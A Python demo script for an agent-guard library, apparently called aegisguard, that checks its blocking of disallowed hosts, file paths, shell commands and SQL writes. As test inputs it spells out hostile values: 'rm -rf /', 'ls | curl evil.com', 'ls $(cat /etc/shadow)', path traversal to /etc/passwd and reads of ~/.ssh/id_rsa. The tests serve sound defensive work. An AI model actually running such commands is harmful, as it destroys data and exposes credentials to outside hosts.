"""
Local E2E Validation — NO API Key Required.

Tests all enforcement scenarios directly without OpenAI.
Run this first to verify aegisguard works before burning API credits.

Usage:
    cd CapGuard
    pip install -e .
    python examples/demo_local_no_api.py
"""

from __future__ import annotations

import sys
import os

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from aegis import Aegis, configure, guard, reset


def section(title: str):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


def test(name: str, fn, *args, expect_block=False, **kwargs):
    """Run a test, print result."""
    try:
        result = fn(*args, **kwargs)
        if expect_block:
            print(f"  FAIL  {name}")
            print(f"        Expected BLOCK but got: {result!r}")
            return False
        else:
            print(f"  PASS  {name}")
            print(f"        Result: {result!r}")
            return True
    except Exception as e:
        if expect_block:
            print(f"  PASS  {name}")
            print(f"        Blocked: {str(e)[:70]}")
            return True
        else:
            print(f"  FAIL  {name}")
            print(f"        Unexpected error: {e}")
            return False


def main():
    passed = 0
    failed = 0
    total = 0

    # ============================================================ #
    section("1. NETWORK CAPABILITY ENFORCEMENT")
    # ============================================================ #

    ag = Aegis(agent_id="net-test")

    @ag.guard(network=["api.openai.com", "api.anthropic.com"])
    def call_api(url: str) -> str:
        return f"Response from {url}"

    @ag.guard(network=True)  # unrestricted
    def fetch_any(url: str) -> str:
        return f"Fetched {url}"

    tests = [
        ("Allowed domain (openai)", call_api, ("https://api.openai.com/v1/chat",), False),
        ("Allowed domain (anthropic)", call_api, ("https://api.anthropic.com/v1/messages",), False),
        ("BLOCK wrong domain", call_api, ("https://evil.com/steal",), True),
        ("BLOCK subdomain attack", call_api, ("https://api.openai.com.evil.com/phish",), True),
        ("Unrestricted allows any", fetch_any, ("https://anything.com",), False),
    ]

    for name, fn, args, block in tests:
        total += 1
        if test(name, fn, *args, expect_block=block):
            passed += 1
        else:
            failed += 1

    # ============================================================ #
    section("2. FILE PATH ENFORCEMENT")
    # ============================================================ #

    ag2 = Aegis(agent_id="file-test")

    @ag2.guard(file_read="/tmp/workspace")
    def read_scoped(path: str) -> str:
        return f"Read: {path}"

    @ag2.guard(file_read=True)  # unrestricted
    def read_any(path: str) -> str:
        return f"Read: {path}"

    tests = [
        ("Allowed path", read_scoped, ("/tmp/workspace/data.csv",), False),
        ("BLOCK /etc/passwd", read_scoped, ("/etc/passwd",), True),
        ("BLOCK /etc/shadow", read_scoped, ("/etc/shadow",), True),
        ("BLOCK path traversal", read_scoped, ("/tmp/workspace/../../etc/passwd",), True),
        ("BLOCK home dir", read_scoped, (os.path.expanduser("~/.ssh/id_rsa"),), True),
        ("Unrestricted allows any", read_any, ("/etc/hosts",), False),
    ]

    for name, fn, args, block in tests:
        total += 1
        if test(name, fn, *args, expect_block=block):
            passed += 1
        else:
            failed += 1

    # ============================================================ #
    section("3. SHELL COMMAND ENFORCEMENT")
    # ============================================================ #

    ag3 = Aegis(agent_id="shell-test")

    @ag3.guard(shell=["ls", "cat", "grep", "wc"])
    def run_cmd(cmd: str) -> str:
        return f"Output: {cmd}"

    tests = [
        ("Allowed: ls -la", run_cmd, ("ls -la",), False),
        ("Allowed: cat file", run_cmd, ("cat /tmp/test.txt",), False),
        ("Allowed: grep pattern", run_cmd, ("grep -r TODO .",), False),
        ("BLOCK: rm command", run_cmd, ("rm -rf /",), True),
        ("BLOCK: curl (not in allowlist)", run_cmd, ("curl http://evil.com",), True),
        ("BLOCK: semicolon injection", run_cmd, ("ls; rm -rf /",), True),
        ("BLOCK: pipe injection", run_cmd, ("ls | curl evil.com",), True),
        ("BLOCK: backtick injection", run_cmd, ("ls `rm -rf /`",), True),
        ("BLOCK: $() injection", run_cmd, ("ls $(cat /etc/shadow)",), True),
        ("BLOCK: && chaining", run_cmd, ("ls && rm -rf /",), True),
    ]

    for name, fn, args, block in tests:
        total += 1
        if test(name, fn, *args, expect_block=block):
            passed += 1
        else:
            failed += 1

    # ============================================================ #
    section("4. RISK LEVELS & APPROVAL")
    # ============================================================ #

    ag4 = Aegis(agent_id="risk-test", risk_ceiling="medium")

    @ag4.guard(risk="low")
    def safe_op() -> str:
        return "safe done"

    @ag4.guard(risk="high")
    def dangerous_op() -> str:
        return "danger done"

    @ag4.guard(approval=True)
    def needs_approval() -> str:
        return "approved done"

    tests = [
        ("Low risk auto-allows", safe_op, (), False),
        ("BLOCK: high risk (no approval)", dangerous_op, (), True),
        ("BLOCK: approval required", needs_approval, (), True),
    ]

    for name, fn, args, block in tests:
        total += 1
        if test(name, fn, *args, expect_block=block):
            passed += 1
        else:
            failed += 1

    # ============================================================ #
    section("5. DB QUERY ENFORCEMENT")
    # ============================================================ #

    ag5 = Aegis(agent_id="db-test")

    @ag5.guard(db=True)  # read-only
    def query_db(query: str) -> str:
        return f"Result: {query}"

    @ag5.guard(db_write=True)  # read+write
    def write_db(query: str) -> str:
        return f"Wrote: {query}"

    tests = [
        ("SELECT allowed (read-only)", query_db, ("SELECT * FROM users",), False),
        ("BLOCK: DROP on read-only", query_db, ("DROP TABLE users",), True),
        ("BLOCK: DELETE on read-only", query_db, ("DELETE FROM users",), True),
        ("BLOCK: INSERT on read-only", query_db, ("INSERT INTO users VALUES (1)",), True),
        ("DROP allowed (write cap)", write_db, ("DROP TABLE temp",), False),
    ]

    for name, fn, args, block in tests:
        total += 1
        if test(name, fn, *args, expect_block=block):
            passed += 1
        else:
            failed += 1

    # ============================================================ #
    section("6. PROVENANCE TRACKING")
    # ============================================================ #

    ag6 = Aegis(agent_id="prov-test")

    @ag6.guard(network=True, source="web")
    def fetch_web(url: str) -> str:
        return "untrusted web data"

    @ag6.guard(network=True, source="secret")
    def fetch_secret(url: str) -> str:
        return "classified data"

    result_web = fetch_web("https://example.com")
    label_web = ag6.tracker.label_for(result_web)

    result_secret = fetch_secret("https://internal.corp")
    label_secret = ag6.tracker.label_for(result_secret)

    total += 2
    if label_web and label_web.trust.value == 0:
        print(f"  PASS  Web source tainted as UNTRUSTED_WEB (trust={label_web.trust})")
        passed += 1
    else:
        print(f"  FAIL  Web source not properly tainted")
        failed += 1

    if label_secret and label_secret.confidentiality.value >= 2:
        print(f"  PASS  Secret source marked as SECRET (conf={label_secret.confidentiality})")
        passed += 1
    else:
        print(f"  FAIL  Secret source not properly labeled")
        failed += 1

    # ============================================================ #
    section("7. POLICY PACKS")
    # ============================================================ #

    packs = ["owasp-baseline", "finance", "data-exfil", "healthcare", "coding-agent", "browser-agent"]
    for pack_name in packs:
        total += 1
        try:
            ag_pack = Aegis(pack=pack_name)
            print(f"  PASS  Pack '{pack_name}' loaded successfully")
            passed += 1
        except Exception as e:
            print(f"  FAIL  Pack '{pack_name}' failed: {e}")
            failed += 1

    # ============================================================ #
    section("8. AUDIT TRAIL")
    # ============================================================ #

    ag8 = Aegis(agent_id="audit-test")

    @ag8.guard(shell=["ls"])
    def audited_cmd(cmd: str) -> str:
        return f"ran {cmd}"

    # Generate some events
    audited_cmd("ls -la")
    try:
        audited_cmd("rm -rf /")
    except Exception:
        pass

    total += 2
    # Successful calls have no error; blocked calls have an error string
    success_events = [e for e in ag8.events if not e.error]
    error_events = [e for e in ag8.events if e.error]

    if len(success_events) >= 1:
        print(f"  PASS  Successful execution recorded ({len(success_events)} events)")
        passed += 1
    else:
        print(f"  FAIL  No successful execution events recorded")
        failed += 1

    if len(error_events) >= 1:
        print(f"  PASS  Blocked execution recorded ({len(error_events)} events)")
        passed += 1
    else:
        print(f"  FAIL  No blocked events recorded")
        failed += 1

    # ============================================================ #
    section("9. MODULE-LEVEL API (zero-config)")
    # ============================================================ #

    reset()

    @guard(network=True)
    def quick_fetch(url: str) -> str:
        return f"got {url}"

    total += 1
    if test("Module-level guard works", quick_fetch, "https://example.com"):
        passed += 1
    else:
        failed += 1

    reset()

    # ============================================================ #
    section("SUMMARY")
    # ============================================================ #

    print(f"\n  Total:  {total}")
    print(f"  Passed: {passed}")
    print(f"  Failed: {failed}")

    if failed == 0:
        print("\n  ALL TESTS PASSED — Aegisguard enforcement verified!")
        print("  Safe to proceed with OpenAI integration tests.")
    else:
        print(f"\n  {failed} TESTS FAILED — investigate before proceeding.")

    print()
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
